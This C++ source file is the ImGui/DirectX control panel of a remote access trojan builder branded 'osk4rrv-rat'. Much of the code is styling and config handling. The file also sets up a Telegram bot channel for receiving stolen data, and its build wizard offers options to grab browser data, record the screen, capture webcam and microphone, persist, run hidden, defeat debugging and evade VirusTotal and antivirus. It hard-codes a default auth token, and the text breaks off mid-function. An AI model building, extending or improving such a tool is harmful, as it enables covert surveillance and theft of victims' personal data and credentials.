#include "imgui.h"
#include "imgui_impl_win32.h"
#include "imgui_impl_dx11.h"
#include "rat.h"
#include "blz.h"
#include "IconsFontAwesome6.h"
#include <d3d11.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <ctime>
#include <fstream>
#include <algorithm>
#include <cmath>
#include <random>
#include <set>
#include <shlobj.h>
#include <commdlg.h>
#include <cstring>
#include <cstdio>
#include <cstdarg>
#include <thread>
#include <atomic>
#include <mutex>

#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "d3dcompiler.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comdlg32.lib")

static ID3D11Device*            g_pd3dDevice = nullptr;
static ID3D11DeviceContext*     g_pd3dDeviceContext = nullptr;
static IDXGISwapChain*          g_pSwapChain = nullptr;
static ID3D11RenderTargetView*  g_mainRenderTargetView = nullptr;
static HWND                     g_hwnd = nullptr;

bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void CreateRenderTarget();
void CleanupRenderTarget();

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

static bool g_dragging = false;
static POINT g_dragStart = {};
static RECT  g_windowStart = {};

// Corner radius of the whole window. The OS window shape is clipped to the same
// radius (see applyRoundedWindowRegion) so the drawn border and the silhouette
// line up exactly.
static constexpr float kWindowRounding = 12.0f;

// Rounds the actual OS window, not just the drawn surface. The UI already paints
// a rounded canvas, but with WindowPadding 0 and the same colour used as the D3D
// clear colour the square corners of the real window stayed visible.
//
// Windows 11 draws an antialiased rounded corner itself via
// DWMWA_WINDOW_CORNER_PREFERENCE. Windows 10 does not know that attribute (it
// returns E_INVALIDARG), so there we clip the window with a region instead. A
// region edge is hard-clipped and therefore slightly aliased; that is the only
// per-pixel-shape option on Win10 without switching the swap chain to per-pixel
// alpha compositing.
static void applyRoundedWindowRegion(HWND hwnd) {
    if (!hwnd)
        return;

    static const DWORD kCornerPreference = 33; // DWMWA_WINDOW_CORNER_PREFERENCE
    static const int   kCornerRound = 2;       // DWMWCP_ROUND

    bool handledByDwm = false;
    if (HMODULE dwm = LoadLibraryW(L"dwmapi.dll")) {
        typedef HRESULT(WINAPI* DwmSetWindowAttribute_t)(HWND, DWORD, LPCVOID, DWORD);
        if (auto pDwm = (DwmSetWindowAttribute_t)GetProcAddress(dwm, "DwmSetWindowAttribute")) {
            int pref = kCornerRound;
            handledByDwm = SUCCEEDED(pDwm(hwnd, kCornerPreference, &pref, sizeof(pref)));
        }
        FreeLibrary(dwm);
    }

    if (handledByDwm) {
        // DWM owns the shape now; drop any region so we don't harden its edge.
        SetWindowRgn(hwnd, nullptr, TRUE);
        return;
    }

    RECT rc = {};
    GetWindowRect(hwnd, &rc);
    const int w = rc.right - rc.left;
    const int h = rc.bottom - rc.top;
    if (w <= 0 || h <= 0)
        return;

    // CreateRoundRectRgn wants the corner ellipse's full width/height, and its
    // right/bottom bounds are exclusive, hence the +1s.
    const int d = (int)(kWindowRounding * 2.0f + 0.5f);
    if (HRGN rgn = CreateRoundRectRgn(0, 0, w + 1, h + 1, d, d))
        SetWindowRgn(hwnd, rgn, TRUE); // the system owns the region after this
}

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg) {
    case WM_SIZE:
        if (g_pd3dDevice != nullptr && wParam != SIZE_MINIMIZED) {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        // Restoring from minimised re-sends WM_SIZE, and the region can be
        // dropped by some shell transitions, so re-assert it.
        applyRoundedWindowRegion(hWnd);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

static char botTokenBuf[512] = "";
static char chatIdBuf[64] = "";
static char authTokenBuf[256] = "";
static bool authTokenSavedOk = false;
static float authTokenSavedAt = 0.0f;
static bool authTokenIsDefault = true;
static const char* kDefaultAuthToken = "sk-7nR9pL2mK8qW5vT3";
static char storedAuthToken[256] = "";
static TelegramBot telegram;
// Product version. Shown in the title bar, and the payload stamps its Telegram
// headers with the same generation (see kMsgBrand in payload.cpp).
static const char* kAppVersion = "1.1.0";

static bool configLoaded = false;
static bool authLoggedIn = false;
// Settings toggles, persisted in config.ini.
//  autoConnectOnStart — verify the Telegram bot the moment the app starts,
//                       instead of waiting for a manual Connect.
//  disableAppAuth     — skip the auth-token login screen entirely.
static bool autoConnectOnStart = false;
static bool disableAppAuth = false;
static bool showTelegramPopup = false;
static bool showAuthLogin = false;
static bool showAuthFailPopup = false;
static bool authCheckDone = false;
static bool authCheckStarted = false;
static bool authenticating = false;
static float authStartTime = 0.0f;
static int  currentTab = 0;
static bool requestClose = false;
static bool requestMinimize = false;
static std::string sessionId;
static std::string lastTestMessage;
static bool showNotConfiguredWarning = false;
static bool showBuildPopup = false;
static int buildWizardStep = 0; // 0 = select exe, 1 = options, 2 = success
static float buildWizardAnim = 0.0f;
static float buildWizardStepAnim = 1.0f;
static int buildWizardStepFrom = 0;
static char selectedExePath[MAX_PATH] = "";
static char selectedExeName[MAX_PATH] = "";
static int updateIntervalDays = 0;
static int micDurationSec = 10;
static int webcamDurationSec = 10;
static int screenDurationSec = 10;
static char buildStatusMsg[512] = "";
static bool buildOptions[11] = { true, true, false, true, true, false, false, false, false, false, false };
static const char* buildOptionLabels[11] = {
    "Grab browser data",
    "Screenshot + screen record",
    "Auto-start",
    "Grab webcam",
    "Grab microphone",
    "Bypass VirusTotal",
    "Stealth mode",
    "Persistence",
    "Anti-debugging",
    "Encrypt network traffic",
    "Anti-antivirus"
};

// Archive password control (Build -> Options).
//
// Three distinct behaviours, which is why this is a checkbox *plus* a field
// rather than just a field:
//   useCustomPassword == false        -> payload generates a random password
//   useCustomPassword == true, text   -> that exact password is used
//   useCustomPassword == true, empty  -> the archive is written with NO password
static bool useCustomPassword = false;
static char customPasswordBuf[128] = "";
static ImFont* fontBody = nullptr;
static ImFont* fontMedium = nullptr;
static ImFont* fontHeading = nullptr;
static ImFont* fontSplash = nullptr;
static ImFont* fontIcons = nullptr;
static bool showSplash = true;
static float splashStartTime = 0.0f;
static float splashProgress = 0.0f;
static const float SPLASH_DURATION = 3.2f; // seconds
static const int WIN_W = 760;
static const int WIN_H = 500;

static std::string generateSessionId() {
    static constexpr char alphabet[] = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    std::random_device random;
    std::uniform_int_distribution<size_t> pick(0, sizeof(alphabet) - 2);

    std::string id;
    id.reserve(11);
    for (int index = 0; index < 9; ++index) {
        if (index > 0 && index % 3 == 0)
            id.push_back('-');
        id.push_back(alphabet[pick(random)]);
    }
    return id;
}

static std::string getAppDataPath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        std::string dir = std::string(path) + "\\AppDataCfg";
        CreateDirectoryA(dir.c_str(), nullptr);
        return dir + "\\config.ini";
    }
    return "config.ini";
}

static void saveConfigToAppData() {
    std::ofstream f(getAppDataPath());
    if (f.is_open()) {
        f << "token=" << botTokenBuf << "\n";
        f << "chatid=" << chatIdBuf << "\n";
        f << "authtoken=" << authTokenBuf << "\n";
        f << "auto_connect=" << (autoConnectOnStart ? 1 : 0) << "\n";
        f << "disable_app_auth=" << (disableAppAuth ? 1 : 0) << "\n";
        f.close();
        configLoaded = true;
        telegram.setConfig(botTokenBuf, chatIdBuf);
        // Mirror the active token so startup verification uses the latest value.
        if (authTokenBuf[0]) {
            strncpy_s(storedAuthToken, authTokenBuf, sizeof(storedAuthToken) - 1);
            authTokenIsDefault = (strcmp(storedAuthToken, kDefaultAuthToken) == 0);
        }
    }
}

static void loadConfigFromAppData() {
    std::ifstream f(getAppDataPath());
    if (!f.is_open()) return;
    std::string line;
    while (std::getline(f, line)) {
        if (line.rfind("token=", 0) == 0) {
            std::string val = line.substr(6);
            strncpy_s(botTokenBuf, val.c_str(), sizeof(botTokenBuf) - 1);
        } else if (line.rfind("chatid=", 0) == 0) {
            std::string val = line.substr(7);
            strncpy_s(chatIdBuf, val.c_str(), sizeof(chatIdBuf) - 1);
        } else if (line.rfind("authtoken=", 0) == 0) {
            std::string val = line.substr(10);
            strncpy_s(authTokenBuf, val.c_str(), sizeof(authTokenBuf) - 1);
            strncpy_s(storedAuthToken, val.c_str(), sizeof(storedAuthToken) - 1);
        } else if (line.rfind("auto_connect=", 0) == 0) {
            autoConnectOnStart = (line.substr(13) == "1");
        } else if (line.rfind("disable_app_auth=", 0) == 0) {
            disableAppAuth = (line.substr(17) == "1");
        }
    }
    f.close();
    authTokenIsDefault = (storedAuthToken[0] == 0) ||
        (strcmp(storedAuthToken, kDefaultAuthToken) == 0);
    if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
        telegram.setConfig(botTokenBuf, chatIdBuf);
        configLoaded = true;
    }
}

static void resetConfig() {
    botTokenBuf[0] = 0;
    chatIdBuf[0] = 0;
    configLoaded = false;
    authLoggedIn = false;
    authTokenBuf[0] = 0;
    storedAuthToken[0] = 0;
    authTokenIsDefault = true;
    autoConnectOnStart = false;
    disableAppAuth = false;
    telegram.reset();
    DeleteFileA(getAppDataPath().c_str());
}

namespace Ui {
    static constexpr float TitleBarHeight = 56.0f;
    static constexpr float FooterHeight = 40.0f;
    static constexpr float SidebarWidth = 168.0f;
    static constexpr float ContentPadding = 24.0f;

    // Premium dark + champagne gold. Solid surfaces only.
    static const ImVec4 Canvas        = ImVec4(0.047f, 0.047f, 0.051f, 1.0f); // #0C0C0D
    static const ImVec4 Chrome        = ImVec4(0.071f, 0.071f, 0.078f, 1.0f); // #121214
    static const ImVec4 Sidebar       = ImVec4(0.059f, 0.059f, 0.065f, 1.0f); // #0F0F11
    static const ImVec4 Surface       = ImVec4(0.090f, 0.090f, 0.098f, 1.0f); // #171719
    static const ImVec4 SurfaceRaised = ImVec4(0.118f, 0.118f, 0.129f, 1.0f); // #1E1E21
    static const ImVec4 SurfaceHover  = ImVec4(0.149f, 0.149f, 0.161f, 1.0f); // #262629
    static const ImVec4 Border        = ImVec4(0.176f, 0.176f, 0.188f, 1.0f); // #2D2D30
    static const ImVec4 BorderStrong  = ImVec4(0.235f, 0.235f, 0.251f, 1.0f); // #3C3C40
    static const ImVec4 TextPrimary   = ImVec4(0.953f, 0.949f, 0.941f, 1.0f); // #F3F2F0
    static const ImVec4 TextSecondary = ImVec4(0.620f, 0.612f, 0.588f, 1.0f); // #9E9C96
    static const ImVec4 TextMuted     = ImVec4(0.420f, 0.412f, 0.392f, 1.0f); // #6B6964
    static const ImVec4 Accent        = ImVec4(0.788f, 0.663f, 0.384f, 1.0f); // #C9A962
    static const ImVec4 AccentHover   = ImVec4(0.831f, 0.722f, 0.471f, 1.0f); // #D4B878
    static const ImVec4 AccentPressed = ImVec4(0.690f, 0.569f, 0.290f, 1.0f); // #B0914A
    static const ImVec4 Success       = ImVec4(0.420f, 0.690f, 0.490f, 1.0f);
    static const ImVec4 Warning       = ImVec4(0.820f, 0.650f, 0.320f, 1.0f);
    static const ImVec4 Danger        = ImVec4(0.780f, 0.360f, 0.360f, 1.0f);

    static ImU32 color(const ImVec4& value) {
        return ImGui::ColorConvertFloat4ToU32(value);
    }

    static ImVec4 mix(const ImVec4& a, const ImVec4& b, float t) {
        t = std::clamp(t, 0.0f, 1.0f);
        return ImVec4(
            a.x + (b.x - a.x) * t,
            a.y + (b.y - a.y) * t,
            a.z + (b.z - a.z) * t,
            a.w + (b.w - a.w) * t);
    }
}

struct StatusPresentation {
    const char* label;
    ImVec4 color;
};

static StatusPresentation getStatusPresentation() {
    switch (telegram.getStatus()) {
    case TelegramStatus::Connected:
        return { "Connected", Ui::Success };
    case TelegramStatus::Connecting:
        return { "Connecting", Ui::Warning };
    case TelegramStatus::Failed:
        return { "Connection failed", Ui::Danger };
    default:
        return { "Not connected", Ui::TextMuted };
    }
}

static void applyModernTheme() {
    ImGuiStyle& s = ImGui::GetStyle();

    s.WindowRounding = 10.0f;
    s.ChildRounding = 8.0f;
    s.FrameRounding = 6.0f;
    s.PopupRounding = 10.0f;
    s.ScrollbarRounding = 6.0f;
    s.GrabRounding = 4.0f;
    s.TabRounding = 6.0f;

    s.WindowPadding = ImVec2(0, 0);
    s.FramePadding = ImVec2(11, 8);
    s.ItemSpacing = ImVec2(10, 8);
    s.ItemInnerSpacing = ImVec2(8, 5);
    s.ScrollbarSize = 7.0f;

    s.WindowBorderSize = 0.0f;
    s.ChildBorderSize = 1.0f;
    s.FrameBorderSize = 0.0f;
    s.PopupBorderSize = 1.0f;
    s.TabBorderSize = 0.0f;

    ImVec4* c = s.Colors;
    c[ImGuiCol_WindowBg] = Ui::Canvas;
    c[ImGuiCol_ChildBg] = Ui::Surface;
    c[ImGuiCol_PopupBg] = Ui::Surface;
    c[ImGuiCol_Border] = Ui::Border;
    c[ImGuiCol_BorderShadow] = ImVec4(0.0f, 0.0f, 0.0f, 0.0f); // no black shadow ring on frames/buttons
    c[ImGuiCol_Button] = Ui::SurfaceRaised;
    c[ImGuiCol_ButtonHovered] = Ui::SurfaceHover;
    c[ImGuiCol_ButtonActive] = Ui::BorderStrong;
    c[ImGuiCol_FrameBg] = Ui::SurfaceRaised;
    c[ImGuiCol_FrameBgHovered] = Ui::SurfaceHover;
    c[ImGuiCol_FrameBgActive] = Ui::BorderStrong;
    c[ImGuiCol_TitleBg] = Ui::Chrome;
    c[ImGuiCol_TitleBgActive] = Ui::Chrome;
    c[ImGuiCol_TitleBgCollapsed] = Ui::Chrome;
    c[ImGuiCol_Header] = Ui::SurfaceRaised;
    c[ImGuiCol_HeaderHovered] = Ui::SurfaceHover;
    c[ImGuiCol_HeaderActive] = Ui::BorderStrong;
    c[ImGuiCol_Text] = Ui::TextPrimary;
    c[ImGuiCol_TextDisabled] = Ui::TextMuted;
    c[ImGuiCol_TextSelectedBg] = ImVec4(Ui::Accent.x, Ui::Accent.y, Ui::Accent.z, 0.35f);
    // Default checkmark (wizard uses styledCheckbox for B/W fill)
    c[ImGuiCol_CheckMark] = Ui::TextPrimary;
    c[ImGuiCol_CheckboxSelectedBg] = ImVec4(0.88f, 0.88f, 0.86f, 1.0f); // checked idle (not gold)
    c[ImGuiCol_SliderGrab] = Ui::Accent;
    c[ImGuiCol_SliderGrabActive] = Ui::AccentHover;
    c[ImGuiCol_Separator] = Ui::Border;
    c[ImGuiCol_SeparatorHovered] = Ui::BorderStrong;
    c[ImGuiCol_SeparatorActive] = Ui::Accent;
    c[ImGuiCol_ScrollbarBg] = Ui::Canvas;
    c[ImGuiCol_ScrollbarGrab] = Ui::BorderStrong;
    c[ImGuiCol_ScrollbarGrabHovered] = Ui::TextMuted;
    c[ImGuiCol_ScrollbarGrabActive] = Ui::TextSecondary;
    c[ImGuiCol_NavHighlight] = Ui::Accent;
    c[ImGuiCol_ModalWindowDimBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.78f);
}

static bool drawChromeButton(const char* id, const ImVec2& position, bool closeButton) {
    const ImVec2 size(36.0f, 28.0f);
    ImGui::SetCursorScreenPos(position);
    ImGui::InvisibleButton(id, size);

    const bool hovered = ImGui::IsItemHovered();
    const bool held = ImGui::IsItemActive();
    const bool clicked = ImGui::IsItemClicked(ImGuiMouseButton_Left);
    ImDrawList* dl = ImGui::GetWindowDrawList();

    if (hovered || held) {
        ImVec4 background = closeButton
            ? (held ? ImVec4(0.55f, 0.18f, 0.18f, 1.0f) : ImVec4(0.65f, 0.22f, 0.22f, 1.0f))
            : (held ? Ui::SurfaceRaised : Ui::SurfaceHover);
        dl->AddRectFilled(position, ImVec2(position.x + size.x, position.y + size.y), Ui::color(background), 5.0f);
    }

    const ImU32 glyphColor = Ui::color(hovered ? Ui::TextPrimary : Ui::TextSecondary);
    const float cx = position.x + size.x * 0.5f;
    const float cy = position.y + size.y * 0.5f;
    if (closeButton) {
        dl->AddLine(ImVec2(cx - 4.0f, cy - 4.0f), ImVec2(cx + 4.0f, cy + 4.0f), glyphColor, 1.35f);
        dl->AddLine(ImVec2(cx + 4.0f, cy - 4.0f), ImVec2(cx - 4.0f, cy + 4.0f), glyphColor, 1.35f);
    } else {
        dl->AddLine(ImVec2(cx - 5.0f, cy + 1.0f), ImVec2(cx + 5.0f, cy + 1.0f), glyphColor, 1.35f);
    }
    return clicked;
}

static bool styledButton(const char* label, const ImVec2& size, bool primary) {
    // Flat monochrome — solid fill only, no black shadow/overlay
    const ImVec4 bg = primary ? Ui::SurfaceHover : Ui::Surface;
    const ImVec4 bgHover = primary ? Ui::BorderStrong : Ui::SurfaceRaised;
    const ImVec4 bgActive = primary ? Ui::Border : Ui::SurfaceHover;
    const ImVec4 text = primary ? Ui::TextPrimary : Ui::TextSecondary;
    const ImVec4 border = primary ? Ui::BorderStrong : Ui::Border;
    ImGui::PushStyleColor(ImGuiCol_Button, bg);
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, bgHover);
    ImGui::PushStyleColor(ImGuiCol_ButtonActive, bgActive);
    ImGui::PushStyleColor(ImGuiCol_Text, text);
    ImGui::PushStyleColor(ImGuiCol_Border, border);
    ImGui::PushStyleColor(ImGuiCol_BorderShadow, ImVec4(0.0f, 0.0f, 0.0f, 0.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 6.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(12.0f, 0.0f));
    if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
    const bool clicked = ImGui::Button(label, size);
    if (fontMedium) ImGui::PopFont();
    ImGui::PopStyleVar(3);
    ImGui::PopStyleColor(6);
    return clicked;
}

// Black/white monochrome checkbox (no gold)
static bool styledCheckbox(const char* label, bool* value) {
    const bool on = value && *value;
    // ImGui uses CheckboxSelectedBg for checked idle (not FrameBg)
    const ImVec4 selectedBg = ImVec4(0.88f, 0.88f, 0.86f, 1.0f);
    const ImVec4 frame = Ui::SurfaceRaised;
    const ImVec4 frameHover = on ? Ui::TextPrimary : Ui::SurfaceHover;
    const ImVec4 frameActive = on ? Ui::TextSecondary : Ui::BorderStrong;
    const ImVec4 mark = on ? Ui::Canvas : Ui::TextPrimary;
    const ImVec4 border = on ? ImVec4(0.70f, 0.70f, 0.68f, 1.0f) : Ui::Border;

    ImGui::PushStyleColor(ImGuiCol_FrameBg, frame);
    ImGui::PushStyleColor(ImGuiCol_FrameBgHovered, frameHover);
    ImGui::PushStyleColor(ImGuiCol_FrameBgActive, frameActive);
    ImGui::PushStyleColor(ImGuiCol_CheckboxSelectedBg, selectedBg);
    ImGui::PushStyleColor(ImGuiCol_CheckMark, mark);
    ImGui::PushStyleColor(ImGuiCol_Border, border);
    ImGui::PushStyleColor(ImGuiCol_BorderShadow, ImVec4(0.0f, 0.0f, 0.0f, 0.0f));
    ImGui::PushStyleColor(ImGuiCol_Text, on ? Ui::TextPrimary : Ui::TextSecondary);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 4.0f);
    const bool changed = ImGui::Checkbox(label, value);
    ImGui::PopStyleVar(2);
    ImGui::PopStyleColor(8);
    return changed;
}

// Pill-shaped on/off switch. Used for the Settings toggles, where a slide
// reads more like a setting than a checkbox does.
//
// Drawn with the window draw list rather than composed from ImGui widgets so the
// knob can slide smoothly: the track is a rounded rect, the knob a circle whose
// x position eases toward the target each frame.
static bool styledToggle(const char* id, bool* value, float scale = 1.0f) {
    if (!value)
        return false;

    const float trackW = 42.0f * scale;
    const float trackH = 22.0f * scale;
    const float pad = 3.0f * scale;
    const float knobR = (trackH - pad * 2.0f) * 0.5f;

    ImGui::PushID(id);
    ImGui::InvisibleButton("##toggle", ImVec2(trackW, trackH));
    const bool clicked = ImGui::IsItemClicked(ImGuiMouseButton_Left);
    const bool hovered = ImGui::IsItemHovered();
    if (clicked)
        *value = !*value;
    ImGui::PopID();

    // Per-toggle animation slot, keyed by the pointer so each switch animates
    // independently. Small fixed table; collisions just share a phase.
    struct Slot { const bool* key; float phase; };
    static Slot slots[16] = {};
    Slot* slot = &slots[0];
    for (int i = 0; i < 16; ++i) {
        if (slots[i].key == value) { slot = &slots[i]; break; }
        if (slots[i].key == nullptr) { slots[i].key = value; slot = &slots[i]; break; }
    }

    const float target = *value ? 1.0f : 0.0f;
    const float step = 1.0f - std::exp(-18.0f * ImGui::GetIO().DeltaTime);
    slot->phase += (target - slot->phase) * step;

    const ImVec2 p = ImGui::GetItemRectMin();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    // Track: muted when off, accent-tinted when on. Hover lifts it slightly.
    const ImVec4 offTrack = hovered ? Ui::SurfaceHover : Ui::SurfaceRaised;
    const ImVec4 onTrack = Ui::mix(Ui::SurfaceRaised, Ui::Accent, 0.85f);
    dl->AddRectFilled(p, ImVec2(p.x + trackW, p.y + trackH),
        Ui::color(Ui::mix(offTrack, onTrack, slot->phase)), trackH * 0.5f);
    dl->AddRect(p, ImVec2(p.x + trackW, p.y + trackH),
        Ui::color(Ui::mix(Ui::Border, Ui::Accent, slot->phase)), trackH * 0.5f, 0, 1.0f);

    // Knob slides from the left pad to the right pad.
    const float knobMinX = p.x + pad + knobR;
    const float knobMaxX = p.x + trackW - pad - knobR;
    const float knobX = knobMinX + (knobMaxX - knobMinX) * slot->phase;
    const float knobY = p.y + trackH * 0.5f;
    dl->AddCircleFilled(ImVec2(knobX, knobY), knobR,
        Ui::color(Ui::mix(Ui::TextMuted, Ui::Canvas, slot->phase)));

    return clicked;
}

// Label + toggle on one row: label left, switch right-aligned in the panel.
// Returns true when the value changed. `hint` is optional muted text under the
// label. The caller sets the cursor Y for the row; this helper takes care of X.
static bool styledToggleRow(const char* id, const char* label, bool* value, const char* hint = nullptr) {
    const float innerPad = 18.0f;
    const float trackW = 42.0f;
    const float trackH = 22.0f;
    const float startY = ImGui::GetCursorPosY();
    // Right edge of the *content region*, not GetWindowSize(): the window size
    // includes the scrollbar, which would push the switch underneath it now that
    // the Settings panel scrolls.
    const float contentRight = ImGui::GetContentRegionMax().x;

    // Switch first, pinned to the right edge. styledToggle draws from the item
    // rect, so its X must be set before the call.
    ImGui::SetCursorPos(ImVec2(contentRight - trackW, startY));
    const bool changed = styledToggle(id, value);

    // Label on the left, vertically centred on the switch. Drawn after the
    // toggle because the cursor had to move right first; absolute positioning
    // makes the paint order irrelevant.
    const float labelY = startY + (trackH - ImGui::GetTextLineHeight()) * 0.5f;
    ImGui::SetCursorPos(ImVec2(innerPad, labelY));
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
    ImGui::TextUnformatted(label);
    ImGui::PopStyleColor();
    if (hint) {
        ImGui::SetCursorPos(ImVec2(innerPad, startY + trackH + 3.0f));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted(hint);
        ImGui::PopStyleColor();
    }

    // Park the cursor below the row so the next widget stacks correctly.
    //
    // Since ImGui 1.89 a SetCursorPos() that moves the cursor past the parent's
    // content bounds must be followed by an item, otherwise End()/EndChild()
    // fires the "SetCursorPos()/SetCursorScreenPos() to extend window/parent
    // boundaries" assert. The zero-size Dummy is the documented way to
    // materialise that advance — it keeps the parking behaviour intact and makes
    // the call legal when this row happens to be the last thing in a window.
    const float rowH = hint ? 48.0f : 30.0f;
    ImGui::SetCursorPos(ImVec2(innerPad, startY + rowH));
    ImGui::Dummy(ImVec2(0.0f, 0.0f));
    return changed;
}

// One "label ............ value" row: muted label on the left, value right-aligned
// against the content region. Used by the Endpoint and Settings status panels.
//
// The right edge comes from GetContentRegionAvail() rather than the window size so
// the value stays clear of the scrollbar once the panel scrolls, and the clamp
// keeps a long label and a long value from overlapping on a narrow window.
static void drawInfoRow(const char* label, const char* value, const ImVec4& valueColor) {
    ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
    ImGui::TextUnformatted(label);
    ImGui::PopStyleColor();

    const float valueW = ImGui::CalcTextSize(value).x;
    ImGui::SameLine();
    const float hereX = ImGui::GetCursorPosX();
    const float rightAlignedX = hereX + ImGui::GetContentRegionAvail().x - valueW;
    // Ternary rather than std::max(): <windows.h> (pulled in by shlobj.h) defines
    // min/max as macros, which breaks any qualified std::max call.
    ImGui::SetCursorPosX(rightAlignedX > hereX ? rightAlignedX : hereX);

    ImGui::PushStyleColor(ImGuiCol_Text, valueColor);
    ImGui::TextUnformatted(value);
    ImGui::PopStyleColor();
}

static void handleWindowDrag(const ImVec2& dragAreaPos, const ImVec2& dragAreaSize) {
    ImGui::SetCursorScreenPos(dragAreaPos);
    ImGui::InvisibleButton("##titlebar_drag", dragAreaSize);
    if (ImGui::IsItemActive() && ImGui::IsMouseDragging(ImGuiMouseButton_Left)) {
        if (!g_dragging) {
            g_dragging = true;
            GetCursorPos(&g_dragStart);
            GetWindowRect(g_hwnd, &g_windowStart);
        }
        POINT current;
        GetCursorPos(&current);
        SetWindowPos(
            g_hwnd,
            nullptr,
            g_windowStart.left + (current.x - g_dragStart.x),
            g_windowStart.top + (current.y - g_dragStart.y),
            0,
            0,
            SWP_NOSIZE | SWP_NOZORDER);
    } else {
        g_dragging = false;
    }
}

static void drawTitleBar() {
    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetCursorScreenPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddRectFilled(
        p0,
        ImVec2(p0.x + winSize.x, p0.y + Ui::TitleBarHeight),
        Ui::color(Ui::Chrome),
        10.0f,
        ImDrawFlags_RoundCornersTop);
    dl->AddLine(
        ImVec2(p0.x, p0.y + Ui::TitleBarHeight - 1.0f),
        ImVec2(p0.x + winSize.x, p0.y + Ui::TitleBarHeight - 1.0f),
        Ui::color(Ui::Border));

    handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, Ui::TitleBarHeight));

    // Brand block top-left
    ImFont* brandFont = fontMedium ? fontMedium : ImGui::GetFont();
    char versionLabel[64];
    snprintf(versionLabel, sizeof(versionLabel), "Version V%s", kAppVersion);
    dl->AddText(
        brandFont,
        brandFont->LegacySize + 1.0f,
        ImVec2(p0.x + 20.0f, p0.y + 12.0f),
        Ui::color(Ui::TextPrimary),
        "osk4rrv-rat");
    dl->AddText(
        fontBody ? fontBody : ImGui::GetFont(),
        (fontBody ? fontBody->LegacySize : ImGui::GetFontSize()) - 1.0f,
        ImVec2(p0.x + 20.0f, p0.y + 32.0f),
        Ui::color(Ui::TextMuted),
        versionLabel);

    // thin gold mark
    dl->AddRectFilled(
        ImVec2(p0.x, p0.y + 14.0f),
        ImVec2(p0.x + 2.0f, p0.y + Ui::TitleBarHeight - 14.0f),
        Ui::color(Ui::Accent),
        1.0f);

    if (drawChromeButton(
            "##window_minimize",
            ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f),
            false)) {
        requestMinimize = true;
    }
    if (drawChromeButton(
            "##window_close",
            ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f),
            true)) {
        requestClose = true;
    }

    ImGui::SetCursorScreenPos(ImVec2(p0.x, p0.y + Ui::TitleBarHeight));
}

static void drawFooter() {
    const ImVec2 winPos = ImGui::GetWindowPos();
    const ImVec2 winSize = ImGui::GetWindowSize();
    ImDrawList* dl = ImGui::GetWindowDrawList();
    const float y0 = winPos.y + winSize.y - Ui::FooterHeight;

    dl->AddRectFilled(
        ImVec2(winPos.x, y0),
        ImVec2(winPos.x + winSize.x, winPos.y + winSize.y),
        Ui::color(Ui::Chrome),
        10.0f,
        ImDrawFlags_RoundCornersBottom);
    dl->AddLine(
        ImVec2(winPos.x, y0),
        ImVec2(winPos.x + winSize.x, y0),
        Ui::color(Ui::Border));

    const StatusPresentation status = getStatusPresentation();
    const float textY = y0 + 12.0f;

    // left: telegram endpoint status
    dl->AddCircleFilled(ImVec2(winPos.x + 22.0f, textY + 6.0f), 3.5f, Ui::color(status.color));
    char leftBuf[128];
    snprintf(leftBuf, sizeof(leftBuf), "Telegram  %s", status.label);
    dl->AddText(
        fontBody ? fontBody : ImGui::GetFont(),
        fontBody ? fontBody->LegacySize : ImGui::GetFontSize(),
        ImVec2(winPos.x + 32.0f, textY),
        Ui::color(Ui::TextSecondary),
        leftBuf);

    // right: session id
    char rightBuf[96];
    snprintf(rightBuf, sizeof(rightBuf), "Session  %s", sessionId.c_str());
    ImFont* f = fontBody ? fontBody : ImGui::GetFont();
    float fs = fontBody ? fontBody->LegacySize : ImGui::GetFontSize();
    ImVec2 rs = f->CalcTextSizeA(fs, FLT_MAX, 0.0f, rightBuf);
    dl->AddText(
        f,
        fs,
        ImVec2(winPos.x + winSize.x - 20.0f - rs.x, textY),
        Ui::color(Ui::TextMuted),
        rightBuf);
}

static bool verifyAuthToken(const char* token) {
    if (!token || !token[0]) return false;
    // The active token is whatever was saved to config.ini; if nothing was
    // saved yet we fall back to the built-in default.
    const char* active = storedAuthToken[0] ? storedAuthToken : kDefaultAuthToken;
    return strcmp(token, active) == 0;
}

static void drawAuthLoginScreen() {
    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetWindowPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), kWindowRounding);
